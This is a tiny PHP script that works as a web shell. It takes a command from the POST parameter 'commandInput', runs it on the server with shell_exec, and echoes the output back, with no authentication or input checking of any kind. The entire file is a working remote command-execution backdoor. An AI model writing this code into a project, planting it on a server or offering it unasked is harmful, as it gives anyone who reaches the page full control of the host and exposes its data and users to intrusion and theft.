<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the command from the POST request
    $commandInput = $_POST['commandInput'];

    // Execute the command and capture its output
    $commandOutput = shell_exec($commandInput);

    // Return the output as a response
    echo $commandOutput;
}
?>
